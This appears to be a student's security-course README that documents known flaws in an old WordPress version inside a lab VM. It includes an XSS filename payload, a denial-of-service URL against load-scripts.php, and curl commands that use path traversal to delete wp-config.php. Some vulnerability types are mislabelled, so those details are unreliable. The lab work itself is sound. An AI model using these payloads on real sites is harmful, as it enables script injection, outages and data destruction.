# Project 7 - WordPress Pentesting

Time spent: **X** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. (Required) WordPress 3.3-4.7.4 - Large File Upload Error XSS
  - [ ] Summary: An attacker can inject a malicious script into a filename which a victim tries to upload leading to XSS
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.15
  - [ ] GIF Walkthrough: https://github.com/smr1234/WebApplicationSecurity/blob/master/Week7/LargeFileXSS.gif
  - [ ] Steps to recreate: 
		1. Create a file over the maximum allowed upload size ( > 2 mb)
		2. Name file: Dinosaurs secret life<img src=x onerror=alert(1)>.png
		3. Drag file into the upload screen
		4. XSS activated
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/4.2/src/wp-admin/media-new.php
	
1. (Required) 4.9.4 - Application DoS
  - [ ] Summary: The load-scripts.php is a file that was designed for admins to improve
  website performance.  WP did not have admin authentication placed so anyone could be able
  to call load-scripts.  A user could be able to force load-scripts.php and send multiple
  requests to shutdown the server.
    - Vulnerability types: Privelege Escalation
    - Tested in version: 4.2
    - Fixed in version: Not fixed
  - [ ] GIF Walkthrough: https://github.com/smr1234/WebApplicationSecurity/blob/master/Week7/ApplicationDoS.gif
  - [ ] Steps to recreate: 
		1. Navigate to web browser
		2. Enter the following URL:  http://wpdistillery.vm/wp-admin/load-scripts.php?c=1&load=editor,%20common,%20user-profile,media-widgets,media-gallery
  - [ ] Affected source code:
    - [Link 1] https://core.trac.wordpress.org/browser/tags/4.2/src/wp-admin/load-scripts.php
	
1. (Required) 4.9.6 - Authenticated Arbitrary File Deletion
  - [ ] Summary: Attacker can execute arbitrary code that deletes the wp-config.php file
by first deleting a post.  Since there is no check in place to make sure that the file exists
before deleting, the code executed again will delete the first thing that comes up under the
corresponding id for that file, which would be the wp-config.php file.
    - Vulnerability types: Privelege Escalation
    - Tested in version: 4.2
    - Fixed in version: 4.2.21
  - [ ] GIF Walkthrough: https://github.com/smr1234/WebApplicationSecurity/blob/master/Week7/AuthenticatedArbitraryFileDeletion.gif
  - [ ] Steps to recreate: 
		1. Upload an image to the media library
		2. Take note of the itemid value
		3. Visit the "Edit Media" page and navigate to your post
		4. Find the id "_wpnonce" in the HTML
		5. Enter the following command:  curl -v 'wpdistillery.vm/wp-admin/post.php?post=***' -H 'Cookie: ***' -d 'action=editattachment&_wpnonce=***&thumb=../../../../wp-config.php'
		Fill *** with your itemid for post, cookies, and _wpnonce
		6. Find _wpnonce in the class='submitdelete deletion'
		7. curl -v 'wpdistillery.vm/wp-admin/post.php?post=***' -H 'Cookie: ***' -d 'action=delete&_wpnonce=***'
		8. Fill *** with your itemid for post, cookies, and _wpnonce
		9. Reload the page
		10. Done
  - [ ] Affected source code:
    - [Link 1]https://core.trac.wordpress.org/browser/tags/4.2/src/wp-admin/post.php
	
1. (Optional) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
1. (Optional) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php) 

## Assets

List any additional assets, such as scripts or files


## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
